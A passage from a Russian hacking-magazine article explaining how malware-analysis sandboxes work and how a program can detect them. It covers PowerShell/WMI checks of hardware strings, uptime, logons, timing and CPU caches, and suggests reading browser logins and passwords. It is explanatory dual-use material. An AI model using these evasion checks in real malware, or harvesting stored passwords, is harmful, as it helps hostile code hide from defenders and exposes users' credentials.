McAfee (Advanced Threat Defense), Palo Alto (Wildﬁre), Check Point (SandBlast),
Kaspersky (Anti‐Targeted Attack Platform), Group‐IB, TDS. Также сущес твуют
опенсорсные песоч ницы, например Cuckoo Sandbox.
  В России этот сегмент рынка относительно молод и начал активно раз‐
виваться примерно в 2016 году. Технологии песочницы, как ты видишь,
используют практически все топовые произво дители средств информацион‐
ной безопасности.
   Начнем с базы и кратко пробежимся по внут реннему устройству виртуаль‐
ной машины (ВМ). Для начала запомни, что ВМ — это абс тракция от физичес‐
кого железа (аппаратной сос тавляющей). Этот тезис понадобится, чтобы
понимать, откуда у нас, собственно, возникли некоторые из приемов обна‐
ружения изолиро ванных сред.
  Сердце ВМ — это гипервизор. Гипервизор сам по себе в некотором роде
минимальная операционная система (микроядро или наноядро). Он предос‐
тавляет запущенным под его управлением операционным сис темам сервис
виртуальной машины,  то есть виртуализиру ет или эмулирует реальное
(физическое) аппаратное обеспечение. Гипервизор также управляет этими
виртуальными машинами, выделяет и освобождает ресурсы для них.





                     Схема работы виртуал ки

Напомним некоторые особенности виртуальных машин. Во‐первых, цен‐
тральный процессор гипервизора никог да не виртуализируется, а рас пре‐
деляет свои ресурсы между виртуальными машинами. То есть гипервизор
не может выделить, например, половинку от ядра для какой‐либо ВМ. Во‐вто‐
рых, аппаратные компоненты при виртуализации фактически представляют
собой файлы и не могут обла дать физическими характерис тиками HDD,
такими, например, как износ секторов диска и другие параметры из SMART.
   Как правило, вир туальные машины внутри песочниц разворачиваются чис‐
тыми (без специализиро ванных средств анализа вре доносных программ
внутри ВМ). Весь анализ выполняет ся гипервизором, в противоположность
«ручным» иссле дователь ским лабора ториям, где на виртуальную машину уже
установлен  весь джентельменский набор  программ  для  отслеживания
активности вредоноса (OllyDbg, IDA, Wireshark, RegShot, Mon, Ripper, Process
Monitor/Explorer и прочие). В этих прогах каждый соз данный вирусописателя‐
ми модуль защиты или проверка на наличие виртуального окру жения обхо‐
дится правкой кода вируса в дизас семблированном виде. Ниже схе матически
изображен анализ в одной из коммерчес ких песочниц — данные взяты
из патента на продукт. Название мы нарочно оставим за кадром, так как нам
интересен не конкретный производитель, а сама идея и подход к решению
задачи.





                        Работа песочницы

Большинство коммерческих систем динамического анализа объ ектов пос‐
троены по схожей схеме. Кратко пояс ним идею алгоритма.
 1. Файлы, поступающие на ана лиз, попада ют в очередь на проверку.
 2. Приложение, отвечающее за безопас ность, вмес те с анализатором
   выполняет  предварительные  операции:  сигнатурную,  эвристическую
   и иные проверки. Проверка объекта в ВМ сама по себе очень затратна
   по времени и ресурсам. В ито ге определяется, нужно ли отправлять обра‐
   зец на анализ в песочницу, и конкретные параметры виртуальной машины
   (включая вер сию и раз рядность ОС), а также метод анализа объекта.
 3. Объект помещается в ВМ и исполняется. В ВМ нет никакого специали‐
   зированного ПО — только стандартный набор программ обычного офис‐
   ного сотрудника типичной компании; также имеется доступ в интернет
   (выявить сетевую активность вредоноса).
 4. Все действия исследуемой программы внут ри ВМ через гипервизор
   попадают в анализатор, который должен понять, происходит что‐то вре‐
   доносное или нет, опираясь на вшитые в него шаблоны поведения.
 5. Контекст и результаты анализа заносятся в базу данных для хранения,
   дальнейшего исполь зования и обучения ана лиза тора. Отсюда становится
   ясной основная фишка автоматизированных систем анализа объ ектов.
  Они действуют за областью виртуальной машины — на стороне гипер‐
   визора — и анализируют всю пос тупающую на него информацию. Именно
   поэтому вре доносной программе нецелесооб разно искать специальные
   инструменты анализа на стороне ВМ, но мы в статье будем это делать,
   чтобы более широко охватить тему.

На основе каких гипервизоров стро ятся песочницы? Обычно это Open Source
и коммерческие гипер визоры на основе KVM. У того и у другого подхода есть
свои плюсы и минусы, которые мы свели в таб личку.





                 Плю сы и минусы гипервизоров

Очень часто, чтобы скрыть, что прог рамма работает в виртуальной среде,
в гипервизорах с открытым исходным кодом используется метод под наз‐
ванием харденинг. В этом случае часть доступных для определе ния парамет‐
ров (например, идентификаторы произво дителей устройств) пробрасывается
в виртуальную машину или заглуша ется сгенерированными данными.
  Иссле дуя программу в песочнице, эмулиру ют действия пользовате ля
(движение мыши, запуск приложений, работа в интернет‐браузере). Про‐
веряют работу образца с пра вами администра тора, а также сдви гают время,
чтобы выявить специфичес кие усло вия акти вации вредоносной составля‐
ющей (некоторые из них начинают дей ство вать пос ле определенного пери‐
ода «сна») и логических бомб.


ОПРЕДЕЛЕНИЕ РАБОТЫ В ПЕСОЧНИЦЕ
Мы написали небольшую прог раммку на Python с использовани ем PowerShell,
оценивающую «реальность» машины, на которой она запущена. В зависимос‐
ти от условий большинству использованных в программе методов достаточно
прав пользовате ля, однако некоторым для дос товерного результата нужны
привилегии администра тора. Сра зу оговоримся, что тес ты мы проводи ли
на Windows‐платформах — они популярнее всего, и их чаще заражают.
Для простоты мы исполь зовали запросы к WMI (Windows Management Instru‐
mentation, инструментарий управления Windows, то есть технология для обра‐
щения к объектам в системе). Запросы к WMI для уни фикации и наглядности
мы выполняли с использованием PowerShell.
  Иссле довав в общей сложности порядка 70 машин, мы выделили ряд
методов, позволяющих выявить средс тва вир туализации. Условно все методы
определения работы в виртуальной среде мы раз делили на четыре уровня,
начиная с простого поиска строковых признаков виртуализации и заканчивая
определением физических параметров системы, от которых будет сложно
избавиться на виртуальной машине.


Level 1 — поиск харак терных стро ковых иден тификаторов
Самое простое, что может сделать программа, запустившись на новой
машине, — про верить, что это за компь ютер. Если наз вание модели (или
производителя некото рых составляющих) содержит virt либо где‐то присутс‐
твуют ссылки на известных вендоров технологий виртуализации, это уже пер‐
вый тревожный звоночек.
  Параметры производителя и модель компь ютера (Manufacturer и Model)
легко поддаются правке, поэто му их значения остаются на совес ти соз‐
дателей песочниц. Вот как можно отпра вить зап рос к WMI через командную
строку:


wmic computersystem get model,manufacturer

А вот так выглядит запрос в PowerShell:


Get‐WmiObject Win32_ComputerSystem | Select‐Object ‐Property Model,
Manufacturer

В результате обработки запроса мы получим следующий отчет — сравни пер‐
вые три вывода команды для виртуальных машин с показаниями реальной:



  Manufacturer: innotek GmbH
  Model: VirtualBox


  Manufacturer: Parallels Software International Inc.
  Model: Parallels Virtual Platform


  Manufacturer: VMware, Inc.
  Model: VMware Virtual Platform


  Manufacturer: ASUSTeK Computer Inc.
  Model: K53SV (реальная машина. — Прим. авт.)


В официальной документации к гипер визору может встречаться указание
на список доступных для подмены параметров. Так, для гипервизора Virtual‐
Box можно поменять ряд параметров. Перечислим некоторые:
 • DmiBIOSVendor (произво дитель BIOS’a);
 • DmiBIOSVersion (его вер сия);
 • DmiBIOSReleaseDate (и его дата релиза);
 • DmiSystemVendor (производитель ОС);
 • DmiSystemProduct (название ОС);
 • DmiSystemVersion (версия ОС);
 • DmiSystemSerial (серийный номер установки ОС);
 • DmiSystemFamily (семейство ОС);
 • Disk SerialNumber (серийник HDD);
 • Disk FirmwareRevision (его номер прошивки);
 • Disk ModelNumber (модель HDD).


             INFO

                     DMI (Desktop Management Interface) — прог рам‐
                    мный интерфейс  (API), позволяющий програм‐
                     мному обеспечению собирать данные о харак‐
                       теристиках аппаратуры компьютера.


Для начала можно проверить серийный номер BIOS. Это срабатывает часто,
поскольку при создании ВМ никого не волнует тонкая настрой ка базовой
подсистемы ввода‐вывода, поэто му, если нам удастся  получить  прав‐
доподобные сведения, скорее всего, машина реальная. Попробуй набить
данную команду в PowerShell или даже PowerShell ISE (кстати, дальше мы раз‐
влекаемся только на PowerShell и не понимаем, почему ты еще не вошел
в консоль):


Get‐WMIObject Win32_Bios

На реальной машине ты увидишь что‐то вроде



  SMBIOSBIOSVersion : K53SV.320
  Manufacturer      : American Megatrends Inc.
  Name              : BIOS Date: 11/11/11 14:59:25 Ver: 04.06.03
  SerialNumber      : B5N0AS16677319F
  Version           : ASUS ‐ 6222004
  (реальная машина)


А на виртуальной тебе могут дополнитель но подска зать в поле SerialNumber,
какая здесь принята среда виртуализации:



  SBIOSVersion : 6.00
  Manufacturer      : Phoenix Technologies LTD
  Name              : Default System BIOS
  SerialNumber      : VMware‐56 4d 0c d4 94 e7 56 70‐45 0e 17 fa d8 6b
  a4 99
  Version           : PhoenixBIOS 4.0 Release 6.0


Если серийник BIOS недоступен или его длина превышает 25 символов (про‐
верено на практике), это ска жет тебе, что либо машина скры вает свои
параметры, либо они были целенаправлен но изменены.
   Теперь обратим внимание на список запущенных процессов. Как мы пом‐
ним, для коммерческих песочниц этот способ вряд ли окажется эффективен.
К тому же попытка получить список процессов наверняка будет воспринята
как подозрительная. Тем не менее для широты охва та опишем и этот подход.
  Присутствие таких процес сов, как vmtoolsd.exe  (а также vboxtray,
vboxservice, vmacthlp, kqemu), уже само по себе способно зас тавить
задуматься. Добавь к этому список из утилит вроде sysinternals, перечис‐
ленных в начале  статьи, wireshark.exe,  утилит для отладки  (ollydbg,
x64dbg) — и сразу станет понят но, анализирует ли кто‐то твою программу.
Финишной прямой будет обна ружение «песочных» (с программной изоляци‐
ей исполнения) процессов sandboxierpcss, sandboxiedcomlaunch и таких
прог, как Sandboxie, Shade, BuﬀerZone.
  Просто берешь и получаешь список процессов:


Get‐Process

Не сомневаемся, что в списке запущенных процессов ты без труда найдешь
наших подозреваемых:



  Handles NPM(K) PM(K)  WS(K)  VM(M) CPU(s) Id   ProcessName
  ‐‐‐‐‐‐‐ ‐‐‐‐‐‐ ‐‐‐‐‐  ‐‐‐‐‐  ‐‐‐‐‐ ‐‐‐‐‐‐ ‐‐   ‐‐‐‐‐‐‐‐‐‐‐
  443 47 217408 201748 459 72,87 8472 AcroRd32
  89 9 2744 1500 32 0,09 1784 AsLdrSrv
  46 8 2668 516 56 0,09 2084 ATKOSD
  98 13 5488 788 90 0,66 2384 ATKOSD2
  369 13 24208 23660 67 8776 audiodg
  ...
  91 6 1144 5228 53 1.63 944  vmacthlp
  319 22 5720 17536 136 96.78 1260 vmtoolsd
  327 22 4700 14360 94 149.00 1924 vmtoolsd
  ...


Интересно, а если программа определит, что она внутри песочницы, и запус‐
тит бесконечный цикл, который заморо зит ВМ, сможет ли сис тема песочницы
достать артефакты?
  Еще один интересный способ — проверить собственное имя исполня‐
емой программы. Зачастую при анализе в песочницах образец вре доноса
переименовывается на примерно следующее: sample.exe, virus.exe, run‐
me.exe, artifact.exe — или задается имя, равное контрольной сумме
образца.  Думаем,  нормальные  люди  редко  переименовы вают  файлы
перед запуском.
  VMware пре доставляет официальные документированные способы обна‐
ружить виртуальные машины. Первый способ основан на использовании пор‐
та гипервизора 0x5658 (VX) и гипервизора магического 32‐битного значения
DWORD 0x564D5868, который обозначается VMXh. Этот метод очень давно
известен и широко используется вредоносным ПО. Его легко отключить:
перенастроить файл конфига %vmname%.vmx или с помощью допол нительной
фильтрации. Однако этот бэкдор требуется для нормальной работы VMware
Tools.
  В процессорах  Intel и AMD бит 31 регистра ECX инструкции CPUID
зарезервирован как бит присутс твия гипервизора (HV). Гипервизоры, чтобы
указать свое присутствие в гостевой операционной системе, устанавливают
этот бит в единицу, а во всех существу ющих и будущих физических процес‐
сорах этот бит устанавливается в ноль. Гостевые операционные системы
могут просмотреть этот 31‐й бит, чтобы определить, работают они внутри
виртуальной машины или нет.
  Корпорация Microsoft в сво ей официальной документации пишет сле‐
дующее: «Прежде чем использовать какие‐либо функции интерфейса гипер‐
визора, программное обеспечение должно сна чала опре делить, работает ли
он внутри виртуальной среды. На платформах x64 ПО проверяет, что оно
работает в виртуальной среде, выполняя инструкцию CPUID со входом
(регистр EAX), равным 1. Ког да выполняется инструкция CPUID, код должен
проверять бит 31 регис тра ECX. Бит 31 — бит присутс твующего гипервизора.
Если этот бит установлен, то присутству ет гипервизор, иначе ПО работает
в виртуальной среде».
   Если подтверждено присутс твие бита HV, то хорошо знать, какой это тип
HV. Intel и AMD так же зарезервировали в инс трукции CPUID адре са в диапа‐
зоне 0x40000000–0x400000FF. Гипервизоры могут использовать эти адреса,
предоставляя интерфейс для передачи информа ции из гипервизора в гос‐
тевую операционную систему, запущенную внутри виртуальной машины.
VMware определяет адрес 0x40000000 как информацион ный адрес CPUID
гипервизора. Код, работающий на гипервизоре VMware, может протес‐
тировать этот информа ционный адрес CPUID для проверки подписи гипер‐
визора. VMware хранит строку VMwareVMware в регис трах EBX, ECX, EDX инс‐
трукции CPUID 0x40000000.
   Упомянутые методы CPUID используются во вредоносных программах
Win32/Winwebsec. Исходные коды этой мал вари легко найти на просторах
интернета.
  Использование техники CPUID вызовет подозрения у песочницы, как и
поиск запущенных процессов. Технику обнаружения по флагам процес сора
мы использовали на ранних ста диях исследователь ской работы, но после
множества тестов решили от это го модуля отказаться из‐за явной компро‐
метации своего ПО и большого количес тва ложноположительных срабаты‐
ваний.
  Резюмируем: Level 1 — это поиск характерных признаков виртуальных
машин из песочниц, в основном строковых параметров внутри ОС. Сюда
можно отнести:
 • серийные номера BIOS, HDD, CPU;
 • MAC‐адреса;
 • имена платформы, машины, домена, процессов, файлов, ключей реестра;
 • инструменты анализа объекта, находящиеся на самой ВМ (OllyDbg, Wire‐
   shark, RegShot, Mon, Ripper, Process Monitor/Explorer);
 • обнаружение CPUID;
 • измененное имя исполняемо го файла.



                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

         ВРЕДОНОС
  ПОД НАБЛЮДЕНИЕМ
                        КАК РАБОТАЮТ СЕНДБОКСЫ
                           И КАК ИХ ОБОЙТИ





Level 2 — инте рак тив и окру жение системы
В этой части мы ищем признаки, указыва ющие, что машина — «рабочая
лошадка», а не чистая виртуалка, запущенная только для анализа нашей прог‐
раммы. Помимо этого, мы дополнитель но исследуем выделенные для ВМ
мощности.
  Первым делом интересно посмотреть, когда система была запущена.
Любители консоли (это в пос ледний раз, обещаю) используют такую команду:


wmic path Win32_OperatingSystem get LastBootUpTime

и получат такой вывод:



  LastBootUpTime
  20200505015539.735711+180


Немного попотев, можно на PowerShell составить команду вида


Get‐WmiObject win32_operatingsystem | select csname, @{LABEL=’LastBo
otUpTime’;
EXPRESSION={$_.ConverttoDateTime($_.lastbootuptime)}}

И оформить результат в человекопонятном формате:



  csname LastBootUpTime
  ‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐
  Mycomp 04.05.2020 13:50:47


Если система работает меньше десяти минут (uptime), это может означать,
что она была запуще на целенаправлен но для исследования нашего ПО (ско‐
рее всего, это ручной ана лиз) или из снимка виртуальной машины. Каждый
раз при запуске ВМ из одного и того же снапшота значение времени работы
ОС постоянно. Если виртуалка запущена из снимка в песочницах, в некоторых
из них можно найти примерно одинаковое зна чение аптайма. Чтобы никого
не скомпрометировать, ска жем, что это значение было 2000 с ± 100 с. Также
важно отслеживать количес тво дней, про шедших с последнего запуска
машины, поскольку реальные компь ютеры (имеются в виду корпоративные)
вклю чаются и выключаются в среднем раз в день. Если текущее время отли‐
чается от данной метки больше чем на месяц, такая машина подозрительна.
Этот способ рассчитан на недосмотр раз работчиков песочниц.
  При наличии админских прав (заметим, что для максимального раскрытия
возможностей иссле дуемых программ у боль шинства песочниц объекты
запускаются с правами администра тора) попробу ем пос мотреть количество
интерактивных входов в систему. Для этого используем логи безопасности
(если логирование событий вхо да в систему вклю чено).
  Выведем все события с EventId=7001 и 7002 (события входа и выхода
из системы winlogon) за последние семь дней:


$logs = get‐eventlog system ‐ComputerName yourCompName
‐source Microsoft‐Windows‐Winlogon
‐After (Get‐Date).AddDays(‐7);
$res = @();
ForEach ($log in $logs) {
if($log.instanceid ‐eq 7001) {
$type = "Logon"}
Elseif ($log.instanceid ‐eq 7002){
$type="Logoff"}
Else {Continue}
$res += New‐Object PSObject
‐Property @{Time = $log.TimeWritten;
"Event" = $type;
User = (New‐Object System.Security.Principal.SecurityIdentifier $Log.
ReplacementStrings[1]).Translate(
[System.Security.Principal.NTAccount])}};
$res

Вывод будет примерно такой:



  Event  User         Time
  ‐‐‐‐‐  ‐‐‐‐         ‐‐‐‐
  Logon  yourCompName 02.05.2020 10:34:09
  Logoff yourCompName 01.05.2020 21:58:19
  Logon  yourCompName 30.04.2020 17:13:53
  Logoff yourCompName 29.04.2020 23:34:46


Когда мы видим,  что  в систему заходили достаточно  час то  (скажем,
не менее 20 раз за пару месяцев) и регулярно (например, между недавними
входами нет перерыва больше месяца), есть все основания предполагать,
что машина реальна.
  Интересный параметр — количес тво общих сетевых папок (так называ‐
емые админские шары). Обычно в Windows их четыре — C$, D$ (при наличии
раздела), ADMIN$ и IPC$. Как их посмотреть? Вот так:


Get‐WmiObject ‐Class win32_share

Шары выводятся наглядно, да еще и с описанием — красота!



  Name   Path       Description
  ‐‐‐‐   ‐‐‐‐       ‐‐‐‐‐‐‐‐‐‐‐
  ADMIN$ C:\Windows Удаленный Admin
  C$     C:\        Стандартный общий ресурс
  D$     D:\        Стандартный общий ресурс
  IPC$              Удаленный IPC


Также можно использовать аналогичную команду (однако она работает не на
всех версиях PowerShell):


Get‐SmbShare

Если расшарен ных папок нет или не больше двух, вероятно, с машиной
работал матерый пользователь и дорабатывал ее, чтобы ограничить неис‐
пользуемые сетевые ресурсы. Естес твенно, это не стопроцентный признак
виртуальной машины, но как одна из зацепок — очень даже.
  Идем дальше. На вся кий случай проверим такие прос тые показатели,
как размер жесткого диска и оперативки. Сложно представить, что на реаль‐
ной машине будет установлен винчестер объемом менее 100 Гбайт и 2 Гбайт
оперативной памяти.
  Спросить у машины, сколько у нее гигабайтов оперативки, можно так:


$cs = get‐wmiobject ‐class "Win32_ComputerSystem"
 [math]::Ceiling($cs.TotalPhysicalMemory / 1024 / 1024 / 1024)

В ответ она тебе выведет только число. Это удобно для быс трой прикидки, но,
если ты дотошен, давай возь мем от команды все:


$cs = get‐wmiobject ‐class "Win32_ComputerSystem"
$cs

Более подробный вывод команды, несомненно, порадует тебя:



  Domain              : WORKGROUP
  Manufacturer        : ASUSTeK Computer Inc.
  Model               : K53SV
  Name                : mysupuerdupercomp
  PrimaryOwnerName    : author
  TotalPhysicalMemory : 8497418240   (8 Гбайт ОЗУ, реальная машина)


И, возможно, несколько огорчит в виртуалке:



  Domain              : WORKGROUP
  Manufacturer        : VMware, Inc.
  Model               : VMware Virtual Platform
  Name                : IE11WIN10_virtual
  PrimaryOwnerName    :
  TotalPhysicalMemory : 1671300608   (<2 Гбайт ОЗУ)


Получить доступные тома, их метку и раз мер прос то:


Get‐WmiObject ‐Class Win32_logicaldisk

Сравни вывод команды в реальной машине:



  DeviceID     : C:
  DriveType    : 3
  ProviderName :
  FreeSpace    : 29173989376
  Size         : 256051458048 (256 Гбайт — норм)
  VolumeName   : OS


И виртуальных средах:



  DeviceID     : C:
  DriveType    : 3
  ProviderName :
  FreeSpace    : 30396342272
  Size         : 42947571712 (42 Гбайт — прям как в симуляциях)
  VolumeName   : Windows 10_virtual


Еще один признак реальности системы — общее количес тво подключаемых
USB‐устройств. Посчитать их — как нечего делать:


$poo=Get‐WmiObject ‐Class Win32_USBControllerDevice
$poo.count

Вывод команды — общее число подключаемых устройств к системе. Если
за все время работы сис темы к ней подключалось не больше пары устройств,
это подозрительно. На реальных машинах ожи даемо увидеть клавиатуру,
мышь, пару фле шек. На чистой, только что развернутой виртуалке количес тво
зарегистрированных в сис теме USB‐устрой ств обычно не превышает 15.
   Косвенный признак — типы и количество сетевых адаптеров. Если в сис‐
теме присутствует Wi‐Fi‐адаптер, с большой вероятностью можно считать,
что перед нами реальная машина. Прос мотреть сетевые адаптеры можно
командой Get‐WmiObject ‐Class Win32_NetworkAdapter.
  Одна из важных характеристик в аппаратной конфигурации любого компь‐
ютера — это параметры процессора. Банальным подсче том количества ядер
(если меньше двух — это подоз рительно) не стоит ограничиваться. Интерес‐
но еще и опре делить саму модель CPU, особенно если она присутс твует
в списке предустановленных моделей процессора в KVM. Если ввести ука‐
занную ниже команду в командной строке на гипервизоре KVM, то можно уви‐
деть следующее (жирным выделены модели, которые встречались нам
в некоторых песоч ницах):


# kvm ‐cpu ?

Тем самым мы получа ем список поддерживаемых моделей процессоров
для гостевых систем гипервизора:



  x86 qemu64  QEMU Virtual CPU version 2.4.0
  x86 phenom  AMD Phenom(tm) 9550 Quad‐Core Processor
  x86 core2duo  Intel(R) Core(TM)2 Duo CPU     T7700  @ 2.40GHz
  x86 kvm64  Common KVM processor
  x86 qemu32  QEMU Virtual CPU version 2.4.0
  x86 kvm32  Common 32‐bit KVM processor
  x86 coreduo  Genuine Intel(R) CPU           T2600  @ 2.16GHz
  x86 486
  x86 pentium
  x86 pentium2
  x86 pentium3
  x86 athlon  QEMU Virtual CPU version 2.4.0
  x86 n270  Intel(R) Atom(TM) CPU N270   @ 1.60GHz
  x86 Conroe  Intel Celeron_4x0 (Conroe/Merom Class Core 2)
  x86 Penryn  Intel Core 2 Duo P9xxx (Penryn Class Core 2)
  x86 Nehalem  Intel Core i7 9xx (Nehalem Class Core i7)
  x86 Westmere  Westmere E56xx/L56xx/X56xx (Nehalem‐C)
  x86 SandyBridge  Intel Xeon E312xx (Sandy Bridge)
  x86 IvyBridge  Intel Xeon E3‐12xx v2 (Ivy Bridge)
  x86 Haswell‐noTSX  Intel Core Processor (Haswell, no TSX)
  x86 Haswell  Intel Core Processor (Haswell)
  x86 Broadwell‐noTSX  Intel Core Processor (Broadwell, no TSX)
  x86 Broadwell  Intel Core Processor (Broadwell)
  x86 Opteron_G1  AMD Opteron 240 (Gen 1 Class Opteron)
  x86 Opteron_G2  AMD Opteron 22xx (Gen 2 Class Opteron)
  x86 Opteron_G3  AMD Opteron 23xx (Gen 3 Class Opteron)
  x86 Opteron_G4  AMD Opteron 62xx class CPU
  x86 Opteron_G5  AMD Opteron 63xx class CPU
  x86 host  KVM processor with all supported host features (only available
  in KVM mode)


Забавный  факт:  в  некоторых системах динамичес кого анализа можно
заметить несовместимость физичес ких компонентов,  таких  как модель
материнской платы и процес сора (чипсет раз ный), или, например, несо‐
ответствие количества ядер модели CPU.
   Очень полезно узнать, уста новлены ли в системе антивирусные продукты
(в некоторых песоч ницах и в их ВМ были замечены антивирусы). Нелишне
проверить актуальность сиг натурных баз (поле productState, подробную рас‐
шифровку значений можно подглядеть тут). Для такого рода запроса нужно
немного напрячься:


Get‐WmiObject ‐Namespace "root\SecurityCenter2"
‐Class AntiVirusProduct  ‐ComputerName yourCompName

Вывод команды достаточно подробен (мы оставили только ключевые поля).
Не все программы прописываются так качественно, но теперь ты знаешь, где
их искать:



  __GENUS                  : 2
  __CLASS                  : AntiVirusProduct
  __SUPERCLASS             :
  __DYNASTY                : AntiVirusProduct
  …
  displayName              : Trend Micro Titanium Internet
  …
  pathToSignedProductExe   : C:\Program Files\Trend Micro\Titanium\wschan‐
  dler.exe
  pathToSignedReportingExe : C:\Program Files\Trend
  Micro\UniClient\UiFrmwrk\WSCStatusController.exe
  productState             : 266240


Существует пара очень хитрых способов проверить машину на виртуаль‐
ность. Например, можно периодически запрашивать положение курсора
мыши. В случае анализа без имитации пользовательских действий указатель
мыши будет неподвижен зна чительную часть времени. Что необходимо
моделировать движения мыши и нажатия кла виш в песочнице, писала
«Лаборатория Касперского» (на основе файлов WikiLeaks) здесь.
  Более хитроумный способ — подключиться к базе данных браузе ра
и просмотреть историю серфинга, логины и пароли. Например, это можно
сделать с помощью Python‐модуля browserhistory.
  Резюмируем: Level 2 — исследовать базовые аппаратные характеристики
ВМ, наработку и интерактивность. Вот предлагаемые параметры для наб‐
людения:
 • размер HDD, RAM, видеопамяти (об этом и некоторых дру гих параметрах
   см. Level 4) и количес тво ядер процессора;
 • последний запуск компьютера, аптайм, логи Windows (например, количес‐
   тво интерактивных входов с EventID == 4624), параллельно с этим
   по WMI можно проверить, когда уста навливалась ОС (командой $system
  = GetWmiObject Class Win32_OperatingSystem $system.In
  stalldate);
 • движения мыши;
 • история браузера;
 • разрешение монитора, есть ли в системе кулер, подключенные принтеры,
   батарея (помогает определить работу на реаль ном ноутбуке на раз‐два:
   а когда ты видел вир туалку, запущенную на сервере, у которого есть акку‐
   мулятор? Для определения батареи используй команду GetWmiObject
  Win32_Battery), адап тер Wi‐Fi и так далее.


Level 3 — вре мен ные задержки
Анализируем вре мя выполнения ПО и отслежива ем динамичес ки изме‐
няемое время, исходя из предпосылки, что средс тва динамического анализа
вносят задержки в выполнение прог раммы.
  В простейшем случае нужно запомнить время запуска программы (берет‐
ся локальное время системы и время с внеш него NTP — для сопоставления).
Одновременно с запуском программы необ ходимо вести собственный отсчет
времени (например, количес тво тактов про цес сора), чтобы сравнить общее
время работы программы. Для вычисления можно использовать следующую
формулу:
  вре мя финиша работы/фун кции/модуля – вре мя  старта =
количество вре мени внутренне го счетчика
   Если изменилась дата или время (явный показатель работы в песочнице),
это будет сразу заметно, и программа может перейти к выполнению нев‐
редоносного участка кода. Ниже показан отчет о времени работы ПО внутри
одной из песочниц.





                  Фрагмент отчета из песочницы

Скриншот отчета говорит о том, что в системе динамического анализа под‐
менялось как локальное время, так и сетевое на разное количество секунд.
Время выполнения программы сос тавило 33 с, а локальное время увеличи‐
лось на 6 с, при этом зна чение времени по NTP изменилось на 13 с.
  Интересный момент: в рамках тес тов ранней версии нашей программы
на языке Python мы отправили исполня емый файл на анализ в VirusTotal. Спус‐
тя пару дней нам пришел отчет из Канады, где был запущен экземпляр прог‐
раммы:
  Лог FTP-сервера



  103.208.85.223 UNKNOWN wrtftpuser [03/Apr/2017:17:26:07 +0000] "STOR
  file03042020_223856.txt" 226 1025
  BORROS‐PC.lan UNKNOWN ftpuzer [03/Apr/2017:17:29:34 +0000] "RETR
  file03042020_223856.txt" 226 1025



Фрагмент отче та



  Is Admin? > 1
  System uptime of 113 seconds
  UPTIME LESS THAN 10 MIN !!!!!
  total log in: 9777
  machine most likely REAL (more than 15 log in)
  CAN'T GET VALUE OF HDD TEMPERATURE SENSOR
  CAN'T GET VALUE OF CPU TEMPERATURE SENSOR
  ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
  start time: 6.07619124777e‐06
  fin time: 59.5664095576
  time difference (start ‐ fin): 59.5664034814
  TIME_DELAY: 60
  ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
  start LOCAL time: ['2017', '04', '03', '22', '37', '50']
  start NTP time: ['Mon', 'Apr', '03', '22', '55', '01', '2017']
  fin LOCAL time: ['2017', '04', '03', '22', '38', '53']
  fin NTP time: ['Mon', 'Apr', '03', '22', '56', '04', '2017']
  ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
  LOCAL DATE NOT CHANGED
  LOCAL TIME NOT CHANGED
  LOCAL TIME NOT CHANGED (NTP)
  ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
  W_CpuID 1 W_HDD_CPU_TEMP 1.4 W_VMware 1 W_UPTIME 0.2 (весовые коэффици‐
  енты для различных проверок)
  ===============================================
  W_TOTAL → 0.9 (вероятность того, что машина виртуальна)
  ===============================================


Обычное выполнение всей прог раммы занима ет до 20 с, а в данном слу‐
чае 60, что кричит нам об использовании инстру ментов анализа исполняемо‐
го  файла.  Помимо  прочего,  проверка  сис темного  журнала  показа‐
ла 9777 интерактивных входов в систему. Сама программа была запущена
с правами администратора, а система запус тилась 113 с назад. Все это сиг‐
нализирует о ручной проверке образца. На машине отработал даже метод
CPUID!
  В данном случае была запущена виртуальная машина, на которой иссле‐
дователь  тестировал  образцы  предположительно  вредонос ного ПО  с
использованием подготовленной ВМ. VirusTotal еще в 2017 году использовал
собственную динамическую проверку объектов. О значениях температурных
сенсоров мы поговорим позже — когда будем обсуждать Level 4.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

         ВРЕДОНОС
  ПОД НАБЛЮДЕНИЕМ
                        КАК РАБОТАЮТ СЕНДБОКСЫ
                           И КАК ИХ ОБОЙТИ





Level 4 — аппаратные показатели (это физика, детка!)
Наиболее достоверным признаком, что перед нами реальная, а не виртуаль‐
ная машина, можно считать возможность достучаться до железа. При хар‐
денинге  некоторые производители  песочниц  задают имя процессора,
не соответствующее его архитектуре. Аналогичная проблема касается и дру‐
гих параметров, которые не полностью переносятся в виртуальную сре ду
или скрываются либо вовсе не могут быть переда ны в ВМ. Когда в системе
только одно ядро, маловероятно, что это сравнитель но современный компь‐
ютер — скорее пожилой системник, древний нетбук, планшет или виртуаль‐
ная машина.
  Для таких запросов о про цессоре есть свой специальный класс в WMI:


Get‐WmiObject ‐Class Win32_Processor

Он выводит подробную информа цию о свойствах процессора:



  …
  Caption                     : Intel64 Family 6 Model 42 Stepping 7
  …
  Description                 : Intel64 Family 6 Model 42 Stepping 7
  …
  L2CacheSize                 : 256 (размер кеша L2)
  L2CacheSpeed                :
  L3CacheSize                 : 6144 (размер кеша L3)
  L3CacheSpeed                : 0
  …
  Manufacturer                : GenuineIntel
  …
  Name                        : Intel(R) Core(TM) i7‐2630QM CPU @ 2.00GHz
  NumberOfCores               : 4
  NumberOfLogicalProcessors   : 8
  …
  ProcessorId                 : BFEBFBFF000206A7
  …


Обрати внимание на размеры кешей L2 и L3. Вот тебе для сравнения раз‐
меры кешей в виртуальных машинах:



  Vbox:
  L2CacheSize: None
  L3CacheSize: 0


  VMware:
  L2CacheSize: 0
  L3CacheSize: 0


  Paralles:
  L2CacheSize: None
  L3CacheSize: 0


И тут мне все стало яс… Почему кеши второго и третьего уровня равны нулю
